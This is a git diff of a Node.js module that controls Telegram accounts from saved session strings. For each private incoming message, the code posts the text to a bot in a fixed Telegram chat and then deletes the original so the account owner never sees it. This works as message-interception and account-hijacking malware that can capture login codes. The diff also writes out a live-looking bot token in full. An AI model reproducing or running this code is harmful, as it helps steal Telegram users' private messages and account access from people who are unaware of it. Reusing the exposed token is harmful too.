@@ -2,7 +2,7 @@ const { TelegramClient } = require('telegram');
 const { NewMessage } = require("telegram/events/index.js");
 const axios = require('axios');
 const { StringSession } = require('telegram/sessions');
-const ppplbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001801844217`;
+const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
 const clients = new Map();
 
 function getClient(number) {
@@ -21,28 +21,11 @@ async function disconnectAll() {
     clients.clear();
 }
 
-async function fetchWithTimeout(resource, options = {}) {
-    const timeout = options?.timeout || 15000;
-
-    const source = axios.CancelToken.source();
-    const id = setTimeout(() => source.cancel(), timeout);
-    try {
-        const response = await axios({
-            ...options,
-            url: resource,
-            cancelToken: source.token
-        });
-        clearTimeout(id);
-        return response;
-    } catch (error) {
-        if (axios.isCancel(error)) {
-            console.log('Request canceled:', error.message);
-        } else {
-            console.log('Error:', error.message);
-        }
-        return undefined;
-    }
+async function createClient(number, session) {
+    const cli = new TelegramManager(session, number);
+    clients.set(number, cli);
 }
+
 
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
@@ -50,7 +33,6 @@ class TelegramManager {
         this.phoneNumber = phoneNumber;
         this.client = null;
         this.createClient();
-        return this.client
     }
 
     async createClient() {
@@ -59,11 +41,11 @@ class TelegramManager {
                 connectionRetries: 5,
             });
             await this.client.connect();
+            const msg = await this.client.sendMessage("777000", { message: "." });
+            await msg.delete({ revoke: true })
             console.log(`Client connected: ${this.phoneNumber}`);
-            this.client.addEventHandler(this.handleEvents, new NewMessage({ incoming: true }));
+            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
             console.log("Added event");
-            clients.set(this.phoneNumber, this.client);
-            return this.client;
         } catch (error) {
             console.log(error);
         }
@@ -80,22 +62,25 @@ class TelegramManager {
     }
 
     async handleEvents(event) {
+        console.log(event.isPrivate)
         if (event.isPrivate) {
             console.log(event.message.text.toLowerCase());
             const payload = {
-                chat_id: "-1001729935532",
-                text: event.message.text
+                "chat_id": "-1001801844217",
+                "text": event.message.text
             };
             console.log("RECIEVED");
-            const options = {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            };
-            await fetchWithTimeout(`${ppplbot}`, options);
+            
+            axios.post(ppplbot, payload)
+                .then((response) => {
+                    console.log('Message sent successfully:', response.data);
+                })
+                .catch((error) => {
+                    console.error('Error sending message:', error.response.data.description);
+                });
             await event.message.delete({ revoke: true });
         }
     }
 }
 
-module.exports = { TelegramManager, hasClient, getClient, disconnectAll }
+module.exports = { TelegramManager, hasClient, getClient, disconnectAll, createClient }
